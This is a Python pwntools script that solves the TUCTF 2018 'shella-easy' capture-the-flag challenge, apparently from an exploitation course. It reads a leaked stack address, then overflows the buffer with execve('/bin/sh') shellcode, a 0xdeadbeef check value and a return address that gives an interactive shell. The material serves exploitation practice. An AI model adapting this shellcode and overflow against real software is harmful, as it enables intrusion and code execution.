from pwn import process, packing


def exploit():
    shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
    prs = process("/home/matan/Documents/hacking/nightmare/stackoverflow/Tuctf_2018_shella-easy/shella-easy")
    print(prs.recvuntil("have a "))
    leak = prs.recvline().decode().strip().split(' ')[0]
    ret_addr = int(leak, 16)
    buffer = shellcode + b'A' * (64 - len(shellcode)) + packing.p32(0xdeadbeef)
    buffer = buffer + b'A' * (76 - len(buffer)) + packing.p64(ret_addr)
    prs.sendline(buffer)
    prs.interactive()


